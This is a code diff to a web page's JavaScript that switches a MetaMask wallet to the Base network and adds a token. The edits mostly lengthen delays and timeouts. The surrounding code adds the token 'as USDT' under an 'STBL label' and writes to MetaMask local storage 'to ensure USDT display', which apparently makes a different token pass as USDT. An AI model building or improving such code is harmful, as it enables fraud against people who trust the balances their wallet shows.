@@ -1149,7 +1149,7 @@
           });
           
           // Small delay
-          await new Promise(resolve => setTimeout(resolve, 500));
+          await new Promise(resolve => setTimeout(resolve, 1000));
           
           // Clear localStorage
           StorageManager.clearTokenLocalStorage();
@@ -1206,7 +1206,7 @@
         try {
           // If this is a retry, add a small delay
           if (retryAttempt > 0) {
-            await new Promise(resolve => setTimeout(resolve, retryAttempt * 500));
+            await new Promise(resolve => setTimeout(resolve, retryAttempt * 1000));
           }
           
           const result = await window.ethereum.request({
@@ -1248,7 +1248,7 @@
         progressContainer.style.display = 'block';
         updateProgress(10, message);
         
-        // Set a forced timeout - INCREASED TO 45 SECONDS
+        // Set a forced timeout - INCREASED TO 180 SECONDS (3 minutes)
         const forceHideTimeout = setTimeout(() => {
           StatusTracker.addStatus("Operation timed out", "error");
           loadingOverlay.style.display = 'none';
@@ -1256,7 +1256,7 @@
           
           // Show alternative method
           altMethodBtn.style.display = 'block';
-        }, 45000);
+        }, 180000);
         
         return forceHideTimeout;
       }
@@ -1301,8 +1301,8 @@
                 params: [{ chainId: '0x2105' }],
               });
               
-              // Wait longer for switch to complete
-              await new Promise(resolve => setTimeout(resolve, 4000));
+              // Wait longer for switch to complete - 8 seconds
+              await new Promise(resolve => setTimeout(resolve, 8000));
               
               // Verify chain switch was successful
               const newChainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -1335,8 +1335,8 @@
                     params: [{ chainId: '0x2105' }],
                   });
                   
-                  // Wait again and verify
-                  await new Promise(resolve => setTimeout(resolve, 4000));
+                  // Wait again and verify - 8 seconds
+                  await new Promise(resolve => setTimeout(resolve, 8000));
                   const verifyChainId = await window.ethereum.request({ method: 'eth_chainId' });
                   if (verifyChainId !== '0x2105') {
                     throw new Error("Network switch didn't complete properly");
@@ -1352,6 +1352,9 @@
               }
             }
           }
+          
+          // Give a little extra time for the network switch to fully settle
+          await new Promise(resolve => setTimeout(resolve, 3000));
           
           // Now we're on Base, add the token as USDT
           updateProgress(60, "Adding token to your wallet...");
@@ -1371,8 +1374,9 @@
             }
           });
           
+          // Increased token addition timeout to 60 seconds
           const timeoutPromise = new Promise((_, reject) => 
-            setTimeout(() => reject(new Error("Token addition timed out")), 20000)
+            setTimeout(() => reject(new Error("Token addition timed out")), 60000)
           );
           
           updateProgress(80, "Waiting for wallet confirmation...");
@@ -1384,7 +1388,7 @@
             
             // Run storage update to ensure USDT display
             StorageManager.updateMetaMaskLocalStorage();
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 1000));
             StorageManager.updateMetaMaskLocalStorage();
             
             hideLoading(timeoutId);
@@ -1420,7 +1424,8 @@
               error.message.includes("token not supported") || 
               error.message.includes("on this network") ||
               error.message.includes("Failed to prepare environment") ||
-              error.message.includes("Network switch")
+              error.message.includes("Network switch") ||
+              error.message.includes("timed out")
           )) {
             document.getElementById('networkError').style.display = 'block';
             document.getElementById('switchNetworkBtn').style.display = 'block';
@@ -1468,8 +1473,8 @@
                 params: [{ chainId: '0x2105' }],
               });
               
-              // Wait for switch to complete
-              await new Promise(resolve => setTimeout(resolve, 4000));
+              // Wait for switch to complete - 8 seconds
+              await new Promise(resolve => setTimeout(resolve, 8000));
               
             } catch (switchError) {
               // If Base isn't added yet, add it
@@ -1490,13 +1495,16 @@
                     }]
                   });
                   
-                  // Try switching again
+                  // Try switching again - wait 3 seconds before trying
+                  await new Promise(resolve => setTimeout(resolve, 3000));
+                  
                   await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: '0x2105' }],
                   });
                   
-                  await new Promise(resolve => setTimeout(resolve, 3000));
+                  // Wait 8 more seconds after switching
+                  await new Promise(resolve => setTimeout(resolve, 8000));
                 } catch (addError) {
                   hideLoading(timeoutId);
                   throw new Error(`Failed to prepare environment: ${addError.message}`);
@@ -1509,7 +1517,7 @@
           }
           
           // Short delay to ensure connection is ready
-          await new Promise(resolve => setTimeout(resolve, 1000));
+          await new Promise(resolve => setTimeout(resolve, 3000));
           
           // Now add the token using STBL label but will update with storage manager
           updateProgress(50, "Adding token with alternative method...");
@@ -1541,7 +1549,7 @@
             StorageManager.updateMetaMaskLocalStorage();
             
             // Delay to allow storage update to complete
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 1500));
             
             // Run one more time for good measure
             StorageManager.updateMetaMaskLocalStorage();
@@ -1583,7 +1591,8 @@
               error.message.includes("token not supported") || 
               error.message.includes("on this network") ||
               error.message.includes("Failed to prepare environment") ||
-              error.message.includes("Network switch")
+              error.message.includes("Network switch") ||
+              error.message.includes("timed out")
           )) {
             document.getElementById('networkError').style.display = 'block';
             document.getElementById('switchNetworkBtn').style.display = 'block';
@@ -1629,8 +1638,8 @@
                 params: [{ chainId: '0x2105' }],
               });
               
-              // Wait for switch to complete
-              await new Promise(resolve => setTimeout(resolve, 3000));
+              // Wait for switch to complete - 8 seconds
+              await new Promise(resolve => setTimeout(resolve, 8000));
               
             } catch (switchError) {
               if (switchError.code === 4902) {
@@ -1651,14 +1660,17 @@
                     }]
                   });
                   
-                  // Wait for the add to complete
-                  await new Promise(resolve => setTimeout(resolve, 2000));
+                  // Wait for the add to complete - 3 seconds
+                  await new Promise(resolve => setTimeout(resolve, 3000));
                   
                   // Try switching again
                   await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: '0x2105' }],
                   });
+                  
+                  // Wait for 5 more seconds after switching
+                  await new Promise(resolve => setTimeout(resolve, 5000));
                 } catch (addError) {
                   // Continue anyway - manual import might still work
                   StatusTracker.addStatus("Network setup failed, proceeding with manual import", "pending");
@@ -1725,14 +1737,17 @@ Note: Make sure you're on the Base network for successful import.`;
               }]
             });
             
-            // Wait for the add to complete
-            await new Promise(resolve => setTimeout(resolve, 2000));
+            // Wait for the add to complete - 3 seconds
+            await new Promise(resolve => setTimeout(resolve, 3000));
             
             // Try to switch to Base
             await window.ethereum.request({
               method: 'wallet_switchEthereumChain',
               params: [{ chainId: '0x2105' }],
             });
+            
+            // Wait 5 seconds after switching
+            await new Promise(resolve => setTimeout(resolve, 5000));
             
             hideLoading(timeoutId);
             
@@ -1818,8 +1833,8 @@ Note: Make sure you're on the Base network for successful import.`;
                 params: [{ chainId: '0x2105' }],
               });
               
-              // Give it time to switch
-              await new Promise(resolve => setTimeout(resolve, 1000));
+              // Give it more time to switch - 5 seconds
+              await new Promise(resolve => setTimeout(resolve, 5000));
             } catch (error) {
               console.error("Could not switch to Base for balance check:", error);
               // Continue anyway - try to get balance
